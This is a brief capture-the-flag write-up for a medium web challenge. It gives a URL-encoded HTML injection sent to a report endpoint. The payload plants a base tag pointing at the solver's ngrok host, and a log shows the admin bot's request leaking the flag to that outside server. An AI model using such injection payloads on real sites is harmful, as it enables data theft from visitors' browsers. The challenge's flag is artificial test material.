# Stage 5 - flagfriendly - web - medium

## Challenge
Flags for friendly Kuchenblech http://45.76.92.221:8070/

## Solution
Request
```
http://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=%3C/title%3E%3C/head%3E%3Cbody%3E%3Cbase%20href=%22http://4de6ea04.ngrok.io%22%3E
```
Local server
```
ERROR:root:Host: 4de6ea04.ngrok.io
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate

127.0.0.1 - - [29/Dec/2019 02:57:13] "GET /junior-CSP_THE_C_IS_FOR_CYBER.gif HTTP/1.1" 200 -
```

## Links
* https://ngrok.com/

## Flag
```
junior-CSP_THE_C_IS_FOR_CYBER
```
